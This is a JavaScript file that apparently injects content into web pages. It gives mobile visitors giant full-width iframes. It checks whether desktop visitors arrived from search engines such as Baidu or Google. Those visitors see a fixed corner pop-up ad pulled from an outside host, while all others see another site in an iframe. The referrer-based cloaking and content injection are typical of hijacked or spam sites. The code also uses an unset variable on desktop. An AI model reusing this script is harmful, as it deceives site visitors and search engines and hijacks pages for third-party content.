﻿
var pcurl="#";
var anzhuourl="#";
var iosurl="#";
var zgurl='http://batit.aliyun.com';
var echo = function(str){document.write(str);}
var browser={versions:function(){var u=navigator.userAgent,app=navigator.appVersion;return{trident:u.indexOf('Trident')>-1,presto:u.indexOf('Presto')>-1,webKit:u.indexOf('AppleWebKit')>-1,gecko:u.indexOf('Gecko')>-1&&u.indexOf('KHTML')==-1,mobile:!!u.match(/AppleWebKit.*Mobile.*/),ios:!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:u.indexOf('Android')>-1||u.indexOf('Linux')>-1,iPhone:u.indexOf('iPhone')>-1,iPad:u.indexOf('iPad')>-1,webApp:u.indexOf('Safari')==-1}}(),language:(navigator.browserLanguage||navigator.language).toLowerCase()}
if (browser.versions.android){
	m_play_pf = '<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="5200" allowTransparency src="'+anzhuourl+'"></iframe>';
}else if(browser.versions.iPhone||browser.versions.iPad){
	m_play_pf = '<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="5200" allowTransparency src="'+iosurl+'"></iframe>';	
}else{
	var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|haoso|so|360)(\.[a-z0-9\-]+){1,2}\//ig;
	var where =document.referrer;
	if(regexp.test(where))
	{
		var xywidth = "320px";
		var xyheight = "270px";
		var adcontent = '<a href="'+pcurl+'" target="_blank"><img src="http://pc.diaoyong.us/gif/67.gif" /></a>';
		window.onload=function xyshowad(){
		document.getElementById("xywebad").style.display='none';
		window.setTimeout("document.getElementById('xywebad').style.display='block'",500);
		}
		document.writeln("<style type=\"text/css\">");
		document.writeln("#xywebad{display:none;position:fixed;width:"+xywidth+";height:"+xyheight+";text-align:center;bottom:0;right:0;z-index:9999;_position:absolute;_top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,0)||0)-(parseInt(this.currentStyle.marginBottom,0)||0)))}");
		document.writeln("#xywebad a.tpa{position:absolute;top:-20px;right:0;color:#777;font-size:12px;background:#FFF;padding:1px 3px;text-decoration:none;border:1px #AAA solid}");
		document.writeln("#xywebad a:hover.tpa{color:#111;text-decoration:none}");
		document.writeln("#xywebad a.rw{right:35px}");
		document.writeln("#xywebad a.mw{right:70px}");
		document.writeln("</style>");
		document.writeln("<div id=\"xywebad\">");
		document.writeln("<a href=\"javascript:xyclose();\" class=\"tpa cw\">关闭</a>");
		document.writeln(adcontent);
		document.writeln("</div>");	
	}else{
		document.writeln('<IFRAME align=middle marginwidth=0 vspace=-0 marginheight=0 src="'+zgurl+'" frameborder=no width="100%" scrolling=no height=800>');
	}
}
echo(m_play_pf);

function xyclose()
{
var xycdiv = document.getElementById("xywebad");
xycdiv.style.visibility = "hidden";
}
function xyresize()
{
var xyrdiv = document.getElementById("xywebad");
xyrdiv.style.width = xywidth;
xyrdiv.style.height = xyheight;
xyrdiv.style.background = "none";
}
function xytomax()
{
var xymdiv = document.getElementById("xywebad");
xymdiv.style.width = "100%";
xymdiv.style.height = "96%";
xymdiv.style.background = "#EEE";
}